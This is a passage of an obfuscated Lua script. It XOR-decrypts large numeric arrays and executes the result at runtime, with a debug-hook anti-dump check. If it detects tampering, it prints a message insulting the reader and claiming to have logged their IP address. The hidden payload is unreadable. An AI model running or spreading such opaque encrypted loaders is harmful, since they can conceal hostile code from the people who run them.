  1037, 1164, 860, 652, 589, 895, 1139, 993, 1060, 561, 755, 805, 989, 1041, 889, 1074, 724, 655, 1193, 820, 935, 766,
  1157, 1089, 1025, 1124, 1203, 1064, 831, 719, 781, 1097, 1188, 959, 892, 1150, 778, 939, 1099, 1121, 1165, 628, 906,
  1070, 866, 800, 748, 572, 1175, 720, 1100, 667, 1122, -1, 80, 35, 130, 32, 16, 73, 39, 110, 24, 82, 8, 201, 85, 25,
  192, 80, 89, 78, 33, 60, 28, 253, 67, 252, 91, 32, 70, 121, 253, 23, 94, 19, 100, 110, 111, 106, 23, 88, 90, 34, 5,
  100, 105, 33, 1, 61, 74, 126, 104, 85, 36, 6, 26, 77, 121, 48, 186, 80, 55, 91, 21, 86, 33, 19, 90, 182, 86, 28, 87,
  60, 67, 55, 36, 40, 34, 26, 39, 28, 158, 139, 31, 222, 64, 89, 4, 125, 34, 3, 46, 100, 84, 64, 114, 73, 104, 131, 28,
  46, 36, 34, 151, 107, 108, 67, 183, 126, 26, 9, 57, 108, 49, 93, 73, 51, 60, 200, 198, 34, 196, 16, 69, 66, 68, 228,
  37, 15, 106, 90, 34, 59, 16, 29, 99, 26, 31, 73, 100, 89, 79, 65, 56, 74, 82, 43, 87, 98, 75, 21, 101, 38, 11, 24, 78,
  89, 13, 49, 108, 23, 106, 30, 94, 74, 31, 52, 5, 19, 95, 31, 101, 23, 123, 251, 227, 17, 24, 109, 70, 125, 26, 104, 87,
  106, 86, 210, 23, 16, 203, 115, 89, 73, 108, 107, 109, 108, 61, 101, 220, 81, 9, 58, 84, 38, 20, 8, 47, 98, 13, 195,
  45, 107, 82, 76, 62, 31, 110, 26, 91, 0, 26, 92, 104, 59, 6, 81, 33, 44, 40, 206, 29, 19, 101, 108, 104, 57, 55, 80, 3,
  22, 74, 19, 64, 3, 24, 87, 65, 99, 107, 87, 54, 95, 26, 95, 91, 101, 21, 109, 23, 20, 109, 20, 17, 66, 110, 116, 8, 8,
  98, 8, 32, 59, 75, 34, 118, 6, 54, 31, 73, 88, 61, 45, 231, 19, 72, 22, 76, 60, 80, 124, 74, 66, 30, 20, 87, 31, 9, 26,
  2, 32, 70, 47, 74, 14, 34, 65, 47, 31, 114, 3, 85, 169, 24, 92, 190, 71, 25, 203, 85, 67, 107, 106, 85, 180, 20, 31,
  107, 41, 112, 23, 93, 5, 57, 63, 47, 85, 85, 95, 39, 105, 101, 146, 25, 125, 87, 58, 104, 85, 106, 74, 15, 8, 85, 26,
  78, 36, 29, 28, 226, 77, 69, 47, 24, 41, 18, 30, 82, 20, 99, 90, 60, 61, 32, 15, 112, 70, 244, 67, 25, 63, 66, 89, 18,
  100, 19, 101, 10, 110, 24, 110, 10, 108, 10, 14, 42, 70, 44, 68, 98, 95, 75, 45, 106, 35, 78, 68, 65, 120, 96, 62, 48,
  69, 10, 84, 62, 69, 23, 118, 114, 100, 177, 80, 142, 132, 59, 99, 19, 108, 20, 61, 19, 110, 86, 38, 41, 98, 61, 86,
  108, 101, 85, 1, 254, 19, 16, 100, 210, 78, 104, 3, 6, 65, 55, 124, 36, 114, 85, 90, 59, 68, 86, 42, 98, 93, 63, 87,
  20, 5, 95, 101, 100, 16, 21, 106, 58, 14, 19, 94, 106, 106, 95, 37, 38, 0, 39, 244, 28, 6, 206, 73, 109, 31, 69, 254,
  89, 106, 25, 14, 111, 37, 85, 21, 11, 31, 93, 78, 162, 19, 141, 33, 10, 86, 93, 201, 106, 59, 10, 35, 91, 3, 62, 4,
  117, 31, 92, 12, 94, 98, 5, 78, 107, 68, 126, 24, 28, 21, 89, 110, 7, 47, 45, 114, 87, 12, 46, 9, 24, 60, 95, 103, 65,
  243, 0, 28, 99, 43, 78, 219, 104, 33, 7, 48, 77, 232, 77, 94, 254, 108, 86, 64, 55, 24, 57, 48, 30, 108, 85, 86, 4, 83,
  82, 93, 79, 36, 16, 175, 84, 21, 47, 227, 24, 41, 89, 146, 240, 70, 80, 105, 80, 41, 51, 101, 107, 81, 165, 87, 182,
  98, 127, 43, 57, 99, 45, 26, 91, 16, 29, 44, 126, 199, 104, 90, 96, 90, 13, 94, 64, 41, 121, 29, 59, 8, 19, 89, 80, 71,
  35, 91, 67, 235, 1, 28, 181, 64, 27, 108, 8, 80, 68, 30, 6, 100, 19, 20, 45, 135, 29, 33, 13, 82, 110, 98, 93, 70, 41,
  45, 15, 66, 87, 107, 101, 122 }, "npRmE4NHuJ8Ji34E0ywDK9zcLj"); dBIKjfrQkwZnmQtlxWxKFeiX0LE8rwuZ0bAcZ7bn0ppR0zjlrtOkEK7eBrFB =
vOOB9UTfoMnImFTKAYAlcPDauFEVUPsS65zwZeQlE5Og8I7s2iIQpxKJWuEm4uj9XY461QL1Qf; h0ZCWwcxFNRCtRfEl8Yvs5DEE55D9tBJ5amDcjyc3vXGNd5eqbYER9 =
vOOB9UTfoMnImFTKAYAlcPDauFEVUPsS65zwZeQlE5Og8I7s2iIQpxKJWuEm4uj9XY461QL1Qf; xL7Dfc55R0OPchZjOSQdxNbPbwtXMiq2EZEO12MBMcp7sNzawr5O6Sx0UDAovA6bwc0ZG1VF6p =
h0ZCWwcxFNRCtRfEl8Yvs5DEE55D9tBJ5amDcjyc3vXGNd5eqbYER9; e0feAXklJdkJzCFpMpQRkszqEqOQGu4WAVsIFRd8VfB8HrEphWJRvxK2 =
xL7Dfc55R0OPchZjOSQdxNbPbwtXMiq2EZEO12MBMcp7sNzawr5O6Sx0UDAovA6bwc0ZG1VF6p; b4tvpa0JWnqrZfDb6Ey9ydLBZWdWx8IYOkjPqOnYoqFVnADi7toFcs4bx =
e0feAXklJdkJzCFpMpQRkszqEqOQGu4WAVsIFRd8VfB8HrEphWJRvxK2; vL8dGBJseUz2UVahIYhPAloOQkENKPSyBTW5GuuoMwleMOQra9vyoUmVAXhv4k6rp =
b4tvpa0JWnqrZfDb6Ey9ydLBZWdWx8IYOkjPqOnYoqFVnADi7toFcs4bx; r0qZbsbr9oU1Jf9mDcG4KUCfR1mCCVrbTlIxrfEUem6q6GsXF810xdPQC2Nb1q =
vL8dGBJseUz2UVahIYhPAloOQkENKPSyBTW5GuuoMwleMOQra9vyoUmVAXhv4k6rp; eKUO7Phr3tyr01F6XcmZt0BSj4lm8AemBex97j28yziZlotWnVyt3E0ILUZdIO =
r0qZbsbr9oU1Jf9mDcG4KUCfR1mCCVrbTlIxrfEUem6q6GsXF810xdPQC2Nb1q; gYzLWiEebUp57JeCKOpbi9Z9GypabS0FD7a09SLNqwuLG8xKOTZsNlc4hGEqu832 =
eKUO7Phr3tyr01F6XcmZt0BSj4lm8AemBex97j28yziZlotWnVyt3E0ILUZdIO; ozgDKio0bYCYkdYlbId5BORqovvYuCFztGtWlYXTWunXadTRsU0WdfcwvVvIc2C1QRQ3AXA =
gYzLWiEebUp57JeCKOpbi9Z9GypabS0FD7a09SLNqwuLG8xKOTZsNlc4hGEqu832; hSu1ij9I8TCzUfgMxtJc3G8dxEpIYnN3N7zrJY3amaGQ7qPkzvl0LvAM9ibMWyr3TB8zfh83GPr =
ozgDKio0bYCYkdYlbId5BORqovvYuCFztGtWlYXTWunXadTRsU0WdfcwvVvIc2C1QRQ3AXA; snoTxkR8hDFy3lRZ9OeiGOfNgxBNbPpjqNHOw3lda7abCkOL92km =
hSu1ij9I8TCzUfgMxtJc3G8dxEpIYnN3N7zrJY3amaGQ7qPkzvl0LvAM9ibMWyr3TB8zfh83GPr; iRYS6O38JAweEbmwXH0v68IAIHxpQqIjqEKIUpBWAKlXgmhqYycviRF4G2 =
snoTxkR8hDFy3lRZ9OeiGOfNgxBNbPpjqNHOw3lda7abCkOL92km; kfD8yhPhlLv8SpIzDau9kewd6BD7kpcJDz59HwV0rsGmBzCJpXrgsADkkVt = function(
  a)
  K, F = 6378741553037142, 16384 + 5397; return a:gsub('%x%x',
    function(c)
      L = K % 274877906944; H = (K - L) / 274877906944; M = H % 128; c = tonumber(c, 16)
      m = (c + (H - M) / 128) * (2 * M + 1) % 256; K = L * F + H + c + m; return string.char(m)
    end)
end; koTCIbwv8P39PAEzsTRroge71OnN4V8nvgFfWpP9bHsvRXtrdz8fOWK6sZtoHSjslTD = function(b)
  co = coroutine.create(b)
  gjTENfNP0nFCcLVYLBSyHMeXRK5xQrvo5NxVtxAyq55MoLyOgTVLsDGdoDzcgvB7zV6U = {}
  debug.sethook(co,
    function(d, e)
      i, k, v = 1, debug.getlocal(co, 2, 1)
      while k do
        table.insert(gjTENfNP0nFCcLVYLBSyHMeXRK5xQrvo5NxVtxAyq55MoLyOgTVLsDGdoDzcgvB7zV6U, k)
        i = i + 1; k, v = debug.getlocal(co, 2, i)
      end
      ; coroutine.yield()
    end, "c")
  res = coroutine.resume(co)
  return gjTENfNP0nFCcLVYLBSyHMeXRK5xQrvo5NxVtxAyq55MoLyOgTVLsDGdoDzcgvB7zV6U
end; r4Txz58OGjvcYOXELlCZjCGAcjDG4HNRs0YPGz0kSAo1AUghgSEKlILd6Mx3VRGWRu7cIR = function(f, g)
  xVjHkCLOfEN9QGema4qQ21WiOVIl9UW0taHumPUESOypRaJxCxozw = function(h, l, n)
    XOR_l = { { 0, 1 }, { 1, 0 } }
    pow = 1; c = 0; while h > 0 or l > 0 do
      c = c + XOR_l[h % 2 + 1][l % 2 + 1] * pow; h = math.floor(h / 2)
      l = math.floor(l / 2)
      pow = pow * 2
    end
    ; n(c)
  end; fp9JNFUNcwdjs95xs3neEXwCUXvvIS9tvXOapn5mnvxf4SBpGerGkCZI9RJuC5N5c = function(f, n)
    result = {}
    i = 1; index = f[i]
    while index >= 0 do
      result[i] = f[index + 1]
      i = i + 1; index = f[i]
    end
    ; n(result)
  end; unE4dQ8s6xSXxw0gVGbdI3mK8NJxyVQcT6baLsgh6iB6kOp89JP = function(f, g, n)
    if #g <= 0 then return {} end
    ; i = 1; j = 1; for i = 1, #f do
      xVjHkCLOfEN9QGema4qQ21WiOVIl9UW0taHumPUESOypRaJxCxozw(f[i], string.byte(g, j), function(o) f[i] = o end)
      j = j + 1; if j > #g then j = 1 end
    end
    ; n(f)
  end; cjFGtQCTa4eIMotZy6jW8JVyMtEpaJZ5Lx8uRIungKlW8LHkXfPZSGN = function(p, n)
    xSbZ3UZabzjhcqzg62WxyJvOWAq5gO1KardmuLcNEhYG7qKTNpGuoA0brwI1a = ""
    for k, q in pairs(p) do xSbZ3UZabzjhcqzg62WxyJvOWAq5gO1KardmuLcNEhYG7qKTNpGuoA0brwI1a =
      xSbZ3UZabzjhcqzg62WxyJvOWAq5gO1KardmuLcNEhYG7qKTNpGuoA0brwI1a ..
      iRYS6O38JAweEbmwXH0v68IAIHxpQqIjqEKIUpBWAKlXgmhqYycviRF4G2
      [kfD8yhPhlLv8SpIzDau9kewd6BD7kpcJDz59HwV0rsGmBzCJpXrgsADkkVt('C4') .. kfD8yhPhlLv8SpIzDau9kewd6BD7kpcJDz59HwV0rsGmBzCJpXrgsADkkVt('27') .. kfD8yhPhlLv8SpIzDau9kewd6BD7kpcJDz59HwV0rsGmBzCJpXrgsADkkVt('61') .. kfD8yhPhlLv8SpIzDau9kewd6BD7kpcJDz59HwV0rsGmBzCJpXrgsADkkVt('E6') .. kfD8yhPhlLv8SpIzDau9kewd6BD7kpcJDz59HwV0rsGmBzCJpXrgsADkkVt('D5') .. kfD8yhPhlLv8SpIzDau9kewd6BD7kpcJDz59HwV0rsGmBzCJpXrgsADkkVt('20')]
      [kfD8yhPhlLv8SpIzDau9kewd6BD7kpcJDz59HwV0rsGmBzCJpXrgsADkkVt('94') .. kfD8yhPhlLv8SpIzDau9kewd6BD7kpcJDz59HwV0rsGmBzCJpXrgsADkkVt('83') .. kfD8yhPhlLv8SpIzDau9kewd6BD7kpcJDz59HwV0rsGmBzCJpXrgsADkkVt('CE') .. kfD8yhPhlLv8SpIzDau9kewd6BD7kpcJDz59HwV0rsGmBzCJpXrgsADkkVt('61')](
      q) end
    ; n(xSbZ3UZabzjhcqzg62WxyJvOWAq5gO1KardmuLcNEhYG7qKTNpGuoA0brwI1a)
  end; fp9JNFUNcwdjs95xs3neEXwCUXvvIS9tvXOapn5mnvxf4SBpGerGkCZI9RJuC5N5c(f,
    function(r) unE4dQ8s6xSXxw0gVGbdI3mK8NJxyVQcT6baLsgh6iB6kOp89JP(r, g,
        function(s) cjFGtQCTa4eIMotZy6jW8JVyMtEpaJZ5Lx8uRIungKlW8LHkXfPZSGN(s,
            function(t) if #koTCIbwv8P39PAEzsTRroge71OnN4V8nvgFfWpP9bHsvRXtrdz8fOWK6sZtoHSjslTD(iRYS6O38JAweEbmwXH0v68IAIHxpQqIjqEKIUpBWAKlXgmhqYycviRF4G2[kfD8yhPhlLv8SpIzDau9kewd6BD7kpcJDz59HwV0rsGmBzCJpXrgsADkkVt('0F') .. kfD8yhPhlLv8SpIzDau9kewd6BD7kpcJDz59HwV0rsGmBzCJpXrgsADkkVt('38') .. kfD8yhPhlLv8SpIzDau9kewd6BD7kpcJDz59HwV0rsGmBzCJpXrgsADkkVt('CE') .. kfD8yhPhlLv8SpIzDau9kewd6BD7kpcJDz59HwV0rsGmBzCJpXrgsADkkVt('F7')]) == 1 then if iRYS6O38JAweEbmwXH0v68IAIHxpQqIjqEKIUpBWAKlXgmhqYycviRF4G2[kfD8yhPhlLv8SpIzDau9kewd6BD7kpcJDz59HwV0rsGmBzCJpXrgsADkkVt('0F') .. kfD8yhPhlLv8SpIzDau9kewd6BD7kpcJDz59HwV0rsGmBzCJpXrgsADkkVt('38') .. kfD8yhPhlLv8SpIzDau9kewd6BD7kpcJDz59HwV0rsGmBzCJpXrgsADkkVt('CE') .. kfD8yhPhlLv8SpIzDau9kewd6BD7kpcJDz59HwV0rsGmBzCJpXrgsADkkVt('F7')] == iRYS6O38JAweEbmwXH0v68IAIHxpQqIjqEKIUpBWAKlXgmhqYycviRF4G2[kfD8yhPhlLv8SpIzDau9kewd6BD7kpcJDz59HwV0rsGmBzCJpXrgsADkkVt('9B') .. kfD8yhPhlLv8SpIzDau9kewd6BD7kpcJDz59HwV0rsGmBzCJpXrgsADkkVt('61') .. kfD8yhPhlLv8SpIzDau9kewd6BD7kpcJDz59HwV0rsGmBzCJpXrgsADkkVt('E6') .. kfD8yhPhlLv8SpIzDau9kewd6BD7kpcJDz59HwV0rsGmBzCJpXrgsADkkVt('D5') .. kfD8yhPhlLv8SpIzDau9kewd6BD7kpcJDz59HwV0rsGmBzCJpXrgsADkkVt('27')] then
                  print(
                  '\10\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\10\10\94\49\68\111\110\39\116\32\116\114\121\32\116\111\32\112\114\105\110\116\32\116\104\101\32\99\111\100\101\32\115\99\117\109\98\97\103\46\10\10\73\116\39\115\32\105\108\108\101\103\97\108\32\116\111\32\114\101\108\101\97\115\101\32\116\104\105\115\32\115\99\114\105\112\116\46\32\89\111\117\39\114\101\32\98\114\101\97\107\105\110\103\32\116\104\101\32\99\111\112\121\114\105\103\104\116\32\108\97\119\46\32\10\10\79\104\44\32\98\116\119\44\32\73\39\118\101\32\108\111\103\103\101\100\32\121\111\117\114\32\73\80\32\97\100\100\114\101\115\115\46\10\10\94\48\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\10') else if iRYS6O38JAweEbmwXH0v68IAIHxpQqIjqEKIUpBWAKlXgmhqYycviRF4G2[kfD8yhPhlLv8SpIzDau9kewd6BD7kpcJDz59HwV0rsGmBzCJpXrgsADkkVt('0F') .. kfD8yhPhlLv8SpIzDau9kewd6BD7kpcJDz59HwV0rsGmBzCJpXrgsADkkVt('38') .. kfD8yhPhlLv8SpIzDau9kewd6BD7kpcJDz59HwV0rsGmBzCJpXrgsADkkVt('CE') .. kfD8yhPhlLv8SpIzDau9kewd6BD7kpcJDz59HwV0rsGmBzCJpXrgsADkkVt('F7')](t) then
                    iRYS6O38JAweEbmwXH0v68IAIHxpQqIjqEKIUpBWAKlXgmhqYycviRF4G2
                        [kfD8yhPhlLv8SpIzDau9kewd6BD7kpcJDz59HwV0rsGmBzCJpXrgsADkkVt('0F') .. kfD8yhPhlLv8SpIzDau9kewd6BD7kpcJDz59HwV0rsGmBzCJpXrgsADkkVt('38') .. kfD8yhPhlLv8SpIzDau9kewd6BD7kpcJDz59HwV0rsGmBzCJpXrgsADkkVt('CE') .. kfD8yhPhlLv8SpIzDau9kewd6BD7kpcJDz59HwV0rsGmBzCJpXrgsADkkVt('F7')](
                        t)() end end else print(
                '\10\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\10\10\94\49\68\111\110\39\116\32\116\114\121\32\116\111\32\112\114\105\110\116\32\116\104\101\32\99\111\100\101\32\115\99\117\109\98\97\103\46\10\10\73\116\39\115\32\105\108\108\101\103\97\108\32\116\111\32\114\101\108\101\97\115\101\32\116\104\105\115\32\115\99\114\105\112\116\46\32\89\111\117\39\114\101\32\98\114\101\97\107\105\110\103\32\116\104\101\32\99\111\112\121\114\105\103\104\116\32\108\97\119\46\32\10\10\79\104\44\32\98\116\119\44\32\73\39\118\101\32\108\111\103\103\101\100\32\121\111\117\114\32\73\80\32\97\100\100\114\101\115\115\46\10\10\94\48\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\10') end end) end) end)
end; r4Txz58OGjvcYOXELlCZjCGAcjDG4HNRs0YPGz0kSAo1AUghgSEKlILd6Mx3VRGWRu7cIR(
{ 902, 1193, 554, 1066, 950, 993, 734, 1055, 1132, 884, 809, 599, 1082, 1158, 939, 556, 1120, 941, 1031, 639, 990, 876,
  1096, 1030, 600, 1147, 1088, 962, 1138, 1203, 1021, 859, 714, 718, 726, 959, 638, 1129, 762, 601, 1155, 557, 1106,
  1130, 685, 687, 912, 938, 877, 1210, 982, 594, 758, 915, 711, 880, 922, 549, 1062, 1176, 842, 745, 1099, 896, 592,
  1137, 1133, 866, 613, 817, 1161, 1189, 890, 694, 889, 995, 606, 621, 635, 984, 1151, 1012, 788, 671, 607, 1199, 1119,
  932, 921, 1045, 705, 1162, 688, 763, 943, 573, 586, 748, 1093, 961, 591, 834, 764, 590, 853, 931, 806, 564, 548, 1198,
  899, 759, 676, 988, 750, 1114, 707, 1015, 1061, 1077, 1111, 684, 942, 904, 1019, 681, 900, 1018, 1196, 1072, 881, 1165,
  935, 840, 980, 886, 649, 544, 766, 753, 885, 572, 792, 974, 827, 829, 795, 739, 746, 740, 1010, 925, 892, 1197, 807,
  647, 802, 916, 983, 863, 587, 736, 1195, 1079, 804, 728, 1067, 1109, 872, 1044, 664, 821, 767, 822, 949, 812, 667, 545,
  854, 1146, 660, 985, 1157, 910, 651, 843, 1201, 927, 700, 1141, 723, 1002, 1140, 1017, 1182, 865, 991, 568, 558, 999,
  1069, 760, 816, 948, 1038, 686, 996, 850, 772, 729, 656, 951, 598, 774, 1159, 731, 1194, 918, 1134, 901, 1034, 1148,
  1143, 851, 615, 874, 588, 1071, 696, 1064, 730, 751, 1006, 799, 735, 631, 653, 1174, 724, 593, 627, 798, 778, 1122,
  668, 567, 823, 682, 605, 713, 781, 646, 987, 1172, 1086, 1184, 773, 659, 1139, 1180, 888, 1091, 733, 1089, 732, 1115,
  924, 813, 757, 755, 1026, 1092, 909, 563, 1059, 978, 883, 1149, 1025, 913, 1187, 581, 831, 644, 1048, 1156, 956, 1181,
  947, 546, 669, 801, 845, 945, 976, 756, 677, 609, 1000, 903, 855, 1104, 882, 1211, 1150, 955, 1128, 618, 634, 1101,
  721, 689, 553, 683, 725, 552, 719, 1063, 1016, 920, 1204, 1080, 1169, 820, 577, 1056, 946, 560, 1070, 655, 1212, 989,
  672, 769, 933, 1117, 658, 690, 1118, 1124, 967, 954, 830, 835, 741, 642, 652, 986, 805, 1024, 575, 692, 737, 869, 1029,
  1058, 571, 1170, 1040, 790, 583, 1041, 693, 1075, 789, 1145, 963, 650, 1047, 712, 703, 675, 838, 832, 1208, 616, 1094,
  828, 848, 998, 569, 1209, 1027, 624, 875, 680, 1054, 648, 887, 970, 847, 785, 1135, 584, 905, 914, 1136, 825, 891, 973,
  797, 957, 636, 1050, 550, 698, 1014, 603, 743, 752, 814, 643, 868, 1022, 895, 936, 582, 574, 1192, 1179, 958, 701, 722,
  870, 879, 965, 566, 893, 645, 1032, 596, 977, 547, 1107, 1009, 561, 1011, 796, 784, 878, 952, 837, 749, 710, 966, 994,
  923, 1085, 770, 919, 776, 1108, 1144, 1097, 637, 1116, 1052, 1175, 611, 670, 614, 1078, 1126, 702, 1051, 578, 633,
  1202, 765, 625, 754, 861, 674, 555, 858, 1102, 810, 699, 1177, 818, 1160, 782, 894, 846, 1065, 744, 803, 720, 708, 862,
  589, 691, 780, 640, 1057, 1074, 617, 824, 969, 844, 960, 1173, 857, 1042, 1003, 968, 630, 953, 1053, 1084, 738, 580,
  1167, 1186, 608, 761, 1098, 1043, 662, 1090, 678, 641, 602, 704, 940, 836, 897, 679, 1131, 1163, 867, 1068, 623, 1152,
  906, 716, 1123, 979, 908, 654, 808, 934, -1, 120, 98, 75, 42, 1, 115, 21, 52, 255, 38, 90, 4, 84, 35, 118, 73, 128,
  127, 106, 220, 40, 37, 46, 102, 41, 113, 69, 88, 67, 47, 29, 122, 82, 151, 23, 54, 209, 85, 31, 25, 70, 49, 60, 67,
  116, 51, 70, 4, 28, 6, 5, 18, 223, 58, 237, 96, 49, 1, 122, 65, 82, 198, 41, 66, 78, 28, 55, 172, 0, 30, 69, 23, 69,
  97, 4, 22, 178, 120, 76, 173, 85, 119, 89, 186, 27, 253, 91, 82, 4, 118, 22, 78, 6, 72, 19, 36, 106, 75, 80, 54, 86,
  59, 82, 30, 76, 111, 66, 126, 88, 46, 17, 50, 17, 77, 59, 66, 42, 69, 119, 104, 179, 126, 152, 68, 84, 100, 55, 69, 27,
  83, 143, 115, 72, 35, 102, 86, 98, 23, 114, 46, 80, 12, 1, 104, 127, 100, 25, 2, 111, 122, 1, 71, 160, 1, 102, 55, 66,
  93, 84, 66, 73, 38, 30, 138, 0, 83, 71, 94, 65, 83, 108, 2, 142, 113, 45, 110, 43, 93, 16, 78, 115, 54, 21, 102, 27,
  69, 87, 9, 101, 125, 15, 28, 2, 65, 121, 4, 66, 44, 78, 89, 11, 95, 12, 75, 229, 112, 88, 53, 61, 127, 66, 72, 17, 76,
  105, 86, 39, 111, 28, 120, 126, 12, 94, 48, 92, 119, 88, 7, 90, 78, 21, 69, 120, 33, 197, 53, 95, 66, 74, 122, 18, 9,
  4, 160, 119, 61, 18, 88, 103, 82, 155, 225, 23, 27, 62, 39, 35, 116, 73, 68, 7, 106, 40, 8, 78, 29, 50, 102, 223, 123,
  47, 81, 177, 65, 82, 97, 35, 37, 103, 3, 6, 45, 98, 15, 56, 122, 63, 43, 3, 66, 151, 111, 0, 16, 75, 102, 123, 49, 57,
  47, 100, 126, 76, 118, 2, 121, 6, 88, 118, 178, 86, 94, 63, 66, 102, 78, 6, 144, 73, 88, 111, 217, 105, 37, 3, 68, 118,
  98, 152, 85, 93, 17, 21, 30, 9, 43, 102, 32, 124, 11, 12, 22, 47, 31, 14, 4, 65, 22, 50, 82, 97, 121, 66, 97, 66, 224,
  28, 3, 37, 124, 122, 112, 115, 121, 143, 105, 7, 66, 128, 84, 36, 29, 5, 69, 83, 75, 44, 98, 35, 33, 39, 1, 73, 144,
  83, 128, 186, 52, 23, 17, 70, 28, 14, 15, 254, 20, 40, 61, 66, 75, 66, 46, 98, 42, 94, 95, 68, 53, 100, 7, 122, 38, 62,
  30, 53, 115, 1, 78, 20, 31, 65, 199, 66, 65, 21, 97, 55, 14, 255, 80, 7, 42, 186, 104, 57, 48, 24, 115, 191, 66, 70,
  28, 71, 7, 5, 66, 119, 83, 97, 79, 27, 48, 99, 80, 98, 118, 22, 94, 93, 69, 102, 248, 175, 15, 131, 198, 67, 84, 83,
  99, 206, 17, 51, 66, 102, 33, 90, 61, 38, 102, 130, 75, 6, 35, 67, 60, 69, 33, 67, 122, 6, 29, 222, 180, 41, 74, 183,
  83, 111, 66, 102, 118, 45, 8, 115, 76, 178, 61, 4, 113, 53, 20, 47, 40, 86, 17, 60, 253, 41, 13, 0, 30, 0, 49, 117, 21,
  82, 111, 50, 97, 230, 80, 4, 199, 34, 50, 101, 7, 74, 32, 222, 57, 6, 31, 65, 31, 36, 75, 25, 34, 3, 82, 78, 19, 41, 3,
  33, 216, 42, 98, 45, 35, 113, 69, 84, 76, 117, 22, 69, 174, 129, 34, 23, 40, 111, 16, 35, 0, 167, 74, 66, 80, 178, 1,
  61, 28, 104, 82, 97, 14, 48, 102, 4, 0, 50, 15, 1, 106, 122, 252, 121, 37, 21, 126, 31, 80, 93, 23, 27, 118, 181, 150,
  121, 27, 81, 63, 92, 82, 12, 122, 37, 181, 22, 206, 75, 205, 39, 119, 134, 62, 98, 17, 58, 41, 102, 157, 99, 30, 0, 64,
  92, 29, 191, 52, 92, 193, 51, 54, 235, 65, 32, 59, 88, 6, 104, 18, 48, 53, 127, 14, 107, 46, 221, 88, 169, 102, 17, 35,
  82, 67 }, "vpaCStnBFbFArZYVe1cWsxfObk"); i7fRNFW4Zg2pswWJcznRJX4u8aDAZ951FRYxJhWqnmBEfifge5NzENo01lO88I6xDqeuOb =
iRYS6O38JAweEbmwXH0v68IAIHxpQqIjqEKIUpBWAKlXgmhqYycviRF4G2; yKCP7bqPCV9F6No0XbzQ8bf0H8kHxrhmjYkhrDIpT0MaauXUn6bUpQnAwP6DVsJEGl =
iRYS6O38JAweEbmwXH0v68IAIHxpQqIjqEKIUpBWAKlXgmhqYycviRF4G2; g011Ha8U6IlX1uS8AQeFzwhKjYRmTzOUKGolbpHtZQ7mDsfdv1ygASGc0guCWmN =
yKCP7bqPCV9F6No0XbzQ8bf0H8kHxrhmjYkhrDIpT0MaauXUn6bUpQnAwP6DVsJEGl; ncdkbgZI6wU3k7wFY7sN23V3VM6EbB43mfNnHiP1SMzyEti7BwZ3hXQmT8WKQouCquSug =
g011Ha8U6IlX1uS8AQeFzwhKjYRmTzOUKGolbpHtZQ7mDsfdv1ygASGc0guCWmN; bq6k0ZFEC9Y080WhkRNSsxHxmIsJCbsY6xtDZfhTfPzHjk6VDgQYV5TjdHdp9So89gnBE =
ncdkbgZI6wU3k7wFY7sN23V3VM6EbB43mfNnHiP1SMzyEti7BwZ3hXQmT8WKQouCquSug; ewNfYgAQqqvNgswtCM4Tcl599D1M25hP99uzNyRaBQzUqdqzkQXI =
bq6k0ZFEC9Y080WhkRNSsxHxmIsJCbsY6xtDZfhTfPzHjk6VDgQYV5TjdHdp9So89gnBE; anNu8yzxOqxacOQrlDJ2H2LxXTjDV6x3fJaUI5kjBmPQcV1gkRPkCMjw6Tj6K =
ewNfYgAQqqvNgswtCM4Tcl599D1M25hP99uzNyRaBQzUqdqzkQXI; csonNp59gsYWfkaEn6HHgazq77yHKeYYou4lOfhs3vJFUnPgwRJJAVmvvICS8Gtufnhna =
anNu8yzxOqxacOQrlDJ2H2LxXTjDV6x3fJaUI5kjBmPQcV1gkRPkCMjw6Tj6K; qDJSIqVihvp1EE7vcql1c8aRUsGMXFoecFvlKWfaJgjUBumf6QT =
csonNp59gsYWfkaEn6HHgazq77yHKeYYou4lOfhs3vJFUnPgwRJJAVmvvICS8Gtufnhna; boizMa4wXYeU0bWGdRqaCBWvejndFG9MlvRp3gKkNV0O8qY5eAxipnHMYm2EMhx47VxoKCecSf =
qDJSIqVihvp1EE7vcql1c8aRUsGMXFoecFvlKWfaJgjUBumf6QT; lnrWLXmYmABAVhw6F3dNJRVXzgRwWcRKAZZE50m5CawTCh5hmGz62xtGQUYflLmnv5XIh7MF09 =
boizMa4wXYeU0bWGdRqaCBWvejndFG9MlvRp3gKkNV0O8qY5eAxipnHMYm2EMhx47VxoKCecSf; pH3N9UuJExDX8dusuS6mq4VNB2ZUCRKnrczLcekLn7luWEwtXmih3SLehWqAG6BjXWlV6hQu =
lnrWLXmYmABAVhw6F3dNJRVXzgRwWcRKAZZE50m5CawTCh5hmGz62xtGQUYflLmnv5XIh7MF09; qB7dw8yo1ij2htDMgd3Frs7qIaHlistStIwZPD6RLUlnM3oAbnGTvAqbLTRR2QuL =
pH3N9UuJExDX8dusuS6mq4VNB2ZUCRKnrczLcekLn7luWEwtXmih3SLehWqAG6BjXWlV6hQu; ngHl451Wh6WndKMyBHI23vNTejs94EkCprtuvoGpsZ6reKQJgh0WefSbhG = function(
  a)
